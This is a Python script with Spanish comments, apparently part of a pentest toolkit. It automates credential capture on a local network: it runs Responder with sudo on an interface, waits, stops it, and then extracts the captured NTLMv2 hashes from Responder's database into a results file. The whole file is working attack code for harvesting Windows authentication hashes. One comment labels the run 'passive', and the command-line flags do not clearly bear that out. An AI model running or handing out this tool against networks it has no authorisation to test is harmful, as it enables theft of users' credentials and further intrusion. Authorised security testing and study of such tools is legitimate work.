import subprocess  # Para ejecutar comandos externos (como Responder)
import os  # Para manejar rutas y verificar existencia de archivos
import time  # Para hacer pausas (espera durante captura de hashes)
import sqlite3  # Para trabajar con la base de datos de Responder (SQLite)
import signal  # Para enviar señales como SIGINT al proceso de Responder

def run_responder(interface, wait_time=60, output_path="results/smb/hashes.txt"):
    """
    Ejecuta Responder en la interfaz especificada, espera un tiempo determinado
    y luego extrae los hashes NTLMv2 capturados de la base de datos de Responder.
    Guarda los hashes extraídos en el archivo output_path.
    """

    responder_log = "results/smb/responder.log"  # Archivo donde se guarda la salida de Responder
    responder_db = "/usr/share/responder/Responder.db"  # Ruta por defecto a la base de datos de Responder

    # Comando para ejecutar Responder en modo pasivo y con opciones específicas
    responder_cmd = [
        "sudo", "responder", "-I", interface, "-P", "-F", "-v"
    ]

    print(f"[*] Ejecutando Responder en la interfaz {interface}...")

    # Limpieza previa de la base de datos para evitar resultados antiguos
    responder_db = "/usr/share/responder/Responder.db"

    # Verifica si la base de datos existe antes de intentar limpiarla
    if os.path.exists(responder_db):
        try:
            import sqlite3  # Importación redundante pero segura
            conn = sqlite3.connect(responder_db)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM responder;")  # Elimina registros anteriores
            conn.commit()
            conn.close()
            print("[*] Responder.db limpiada antes de iniciar.")
        except Exception as e:
            # Si falla la limpieza, se muestra el error
            print(f"[!] No se pudo limpiar Responder.db: {e}")

    # Abre el archivo de log para guardar la salida del proceso
    with open(responder_log, "w") as log_file:
        try:
            # Lanza el proceso de Responder y redirige stdout y stderr al log
            responder_proc = subprocess.Popen(responder_cmd, stdout=log_file, stderr=log_file)
            print(f"[+] Responder ejecutándose (PID: {responder_proc.pid})")
        except Exception as e:
            # En caso de error al lanzar Responder, muestra el mensaje y termina
            print(f"[!] Error al lanzar Responder: {e}")
            return False

    # Espera el tiempo especificado para que Responder capture tráfico
    print(f"[*] Esperando {wait_time} segundos para captura de hashes...")
    time.sleep(wait_time)

    try:
        # Envía señal SIGINT para detener Responder de forma controlada
        responder_proc.send_signal(signal.SIGINT)
        responder_proc.wait(timeout=5)
        print("[+] Responder detenido correctamente.")
    except subprocess.TimeoutExpired:
        # Si no responde al SIGINT, se fuerza la finalización con kill()
        print("[!] Responder no respondió a SIGINT. Forzando terminación...")
        responder_proc.kill()
        responder_proc.wait()
        print("[+] Responder terminado con kill().")
    except Exception as e:
        # Si ocurre otro tipo de error al detener Responder, se muestra
        print(f"[!] Error al detener Responder: {e}")

    # Verifica si existe la base de datos de Responder antes de extraer los hashes
    if not os.path.exists(responder_db):
        print("[-] No se encontró la base de datos de Responder.")
        return False

    # Lista para almacenar los hashes capturados
    hashes = []
    try:
        # Conexión a la base de datos y extracción de hashes NTLMv2
        conn = sqlite3.connect(responder_db)
        cursor = conn.cursor()
        cursor.execute("SELECT FullHash FROM responder WHERE Type='NTLMv2-SSP';")
        rows = cursor.fetchall()
        for row in rows:
            hashes.append(row[0])  # Se almacena solo el hash (columna FullHash)
        conn.close()
    except Exception as e:
        # En caso de error al acceder a la base de datos, se informa
        print(f"[!] Error al leer Responder.db: {e}")
        return False

    # Si no se capturaron hashes, se indica y se termina
    if not hashes:
        print("[-] No se capturaron hashes NTLMv2.")
        return False

    # Crea el directorio destino del archivo si no existe
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    # Guarda los hashes en el archivo de salida especificado
    with open(output_path, "w") as f:
        for hash_line in hashes:
            f.write(hash_line + "\n")

    # Muestra la cantidad de hashes capturados y guardados
    print(f"[+] {len(hashes)} hash(es) NTLMv2 guardado(s) en {output_path}")
    return True  # Devuelve True indicando éxito
